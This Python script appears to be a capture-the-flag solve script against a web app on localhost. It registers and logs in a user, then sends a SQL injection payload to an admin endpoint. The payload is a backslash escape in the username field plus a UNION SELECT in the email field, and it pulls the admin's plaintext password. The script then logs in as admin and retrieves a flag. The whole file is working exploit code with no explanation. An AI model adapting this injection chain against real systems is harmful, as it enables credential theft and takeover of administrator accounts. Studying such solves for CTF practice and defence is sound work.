import requests as req

url = 'http://localhost:3000'


with req.Session() as r:
    res = req.post(f'{url}/api/auth/register', json={
        'username': 'daaaaaaaa',
        'password': 'daaaaaaaa',
        'email': 'daaaaaaaa@gmail.com'
    })
    
    res = req.post(f'{url}/api/auth/login', json={
        'email': 'daaaaaaaa@gmail.com',
        'password': 'daaaaaaaa'
    })
    token = res.json().get('token')
    headers = {
        "authorization": f"Bearer {token}"
    }

    res = req.post(f'{url}/api/admin/dev', json={
        "username": "\\",
        "email": "and 0 union select id, username, plain_password, role, created_at from users where username like \"admin\";#"
    }, headers=headers)
    admin_password = res.json()[0].get('email')

    res = req.post(f'{url}/api/auth/login', json={
        'email': 'admin@gmail.com',
        'password': admin_password
    })
    token = res.json().get('token')
    headers = {
        "authorization": f"Bearer {token}"
    }
    res = req.get(f'{url}/api/ssd/data', headers=headers)
    flag = res.json()[0].get('data_value')

    print(flag)